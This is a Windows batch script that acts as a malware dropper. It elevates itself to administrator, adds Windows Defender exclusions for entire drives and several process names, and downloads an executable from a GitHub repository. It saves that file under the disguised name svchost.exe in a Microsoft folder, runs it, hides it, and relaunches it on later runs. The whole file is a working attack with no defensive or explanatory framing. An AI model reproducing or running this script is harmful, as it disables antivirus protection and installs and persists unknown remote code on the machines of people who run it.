@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
	
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension ".tmp"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "svchost.exe"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "D:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "E:\"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "server.exe"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "RuntimeBroker.exe"
powershell.exe -inputformat none -outputformat none -NonInteractive -Command add-MpPreference - ExclusionProcess "SteamHelper.exe"

if not exist %temp%\msconfig.txt (
    
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/zerysx-666/project/raw/refs/heads/main/xd.exe' -OutFile $env:localappdata\Microsoft\svchost.exe"
    powershell -Command "Start-Process -FilePath $env:localappdata\Microsoft\svchost.exe"
    attrib +h $env:localappdata\Microsoft\svchost.exe

    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/zerysx-666/project/refs/heads/main/msconfig.txt' -OutFile $env:temp\msconfig.txt"




) else (
    

    powershell -Command "Start-Process -FilePath $env:localappdata\Microsoft\svchost.exe"
    

)



 pause>nul